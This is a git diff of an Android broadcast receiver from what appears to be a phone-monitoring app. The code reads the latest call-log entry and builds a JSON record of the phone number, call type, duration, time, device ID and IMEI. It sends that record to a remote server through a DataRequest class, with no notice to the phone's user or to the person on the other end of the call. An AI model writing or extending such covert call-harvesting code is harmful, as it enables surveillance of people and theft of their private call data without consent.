@@ -16,12 +16,16 @@ import android.database.Cursor;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
-import com.inet.android.bs.FileLog;
-import com.inet.android.bs.Request;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
+/** Класс сбора звонков
+ * 
+ * @author johny homicide
+ *
+ */
 public class CallReceiver extends BroadcastReceiver {
 	String phoneNumber = "";
 	File outFile;
@@ -32,32 +36,27 @@ public class CallReceiver extends BroadcastReceiver {
 	String date;
 	SharedPreferences sp;
 	private static String LOG_TAG = "callReciver";
-	Request req;
 
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
-		// TODO Auto-generated method stub
 		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
 		String call = sp.getString("KBD", "0");
 
 		if (call.equals("0")) {
-			Log.d(LOG_TAG, "KBD = 0");
-			FileLog.writeLog("CallReciver: KBD = 0");
+			Logging.doLog(LOG_TAG, "KBD = 0", "KBD = 0");
 			return;
 		}
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
-			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(LOG_TAG, "after isWork retrun 0");
-			FileLog.writeLog("Callreciver: isWork return "
-					+ Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: after isWork retrun 0");
+			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork), 
+					"isWork return " + Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "after isWork retrun 0", 
+					"after isWork retrun 0");
 
 			return;
 		} else {
-			Log.d(LOG_TAG, Boolean.toString(isWork));
-			FileLog.writeLog("Callreciver: isWork - "
-					+ Boolean.toString(isWork));
+			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork), 
+					"isWork - " + Boolean.toString(isWork));
 		}
 
 		date = logTime();
@@ -83,7 +82,6 @@ public class CallReceiver extends BroadcastReceiver {
 					// TimeUnit.SECONDS.sleep(1);
 					TimeUnit.MILLISECONDS.sleep(1000);
 				} catch (InterruptedException e) {
-					// TODO Auto-generated catch block
 					e.printStackTrace();
 				}
 				getCallDetails();
@@ -99,7 +97,6 @@ public class CallReceiver extends BroadcastReceiver {
 
 		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
 		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-		// int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
 		int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
 
 		sb.append("Call Details :");
@@ -107,44 +104,51 @@ public class CallReceiver extends BroadcastReceiver {
 		managedCursor.moveToLast();
 		String phNumber = managedCursor.getString(number);
 		String callType = managedCursor.getString(type);
-		// String callDate = managedCursor.getString( date );
-		// Date callDayTime = new Date(Long.valueOf(callDate));
 		String callDuration = managedCursor.getString(duration);
 		if (Integer.parseInt(callDuration) < 30) {
 			callDuration = "30";
 		}
-		String dir = null;
+		String callTypeStr = null;
 		int dircode = Integer.parseInt(callType);
 
 		switch (dircode) {
 		case CallLog.Calls.OUTGOING_TYPE:
-			dir = "исх. звонок";
+			callTypeStr = "Outgoing";
 			break;
 
 		case CallLog.Calls.INCOMING_TYPE:
-			dir = "вх. звонок";
+			callTypeStr = "Incoming";
 			break;
 
 		case CallLog.Calls.MISSED_TYPE:
-			dir = "пропущенный звонок";
+			callTypeStr = "Missed";
 			break;
 		}
 
-		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir
+		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + callType
 				+ " \nCall Date:--- " + date + " \nCall duration in sec :--- "
 				+ callDuration);
 		sb.append("\n----------------------------------");
 		managedCursor.close();
 
-		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-				+ "</id><time>" + date + "</time><type>4</type><app>" + dir
-				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
-				+ "</ntime></packet>";
-		req = new Request(ctx);
-		req.sendRequest(sendStr);
+//		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
+//				+ "</id><time>" + date + "</time><type>4</type><app>" + callType
+//				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
+//				+ "</ntime></packet>";
+		String sendJSONStr = "\"id\":\"" + sp.getString("ID", "0000") + "\","
+				+ "\"imei\":\"" + sp.getString("IMEI", "0000") + "\","
+				+ "\"time\":\"" + date + "\","
+				+ "\"type\":\"2\","
+				+ "\"app\":\"" + callTypeStr + "\","
+				+ "\"tel\":\"" + phNumber + "\","
+				+ "\"duration\":\"" + callDuration + "\"}";
+//		RequestMakerImpl req = new RequestMakerImpl(ctx);
+//		req.sendDataRequest(sendJSONStr);
+		
+		DataRequest dr = new DataRequest(ctx);
+		dr.sendRequest(sendJSONStr);
 
-		Log.d("callRec", sb.toString());
-		FileLog.writeLog("Callreciver: " + sb.toString());
+		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 	}
 
 	@SuppressLint("SimpleDateFormat")
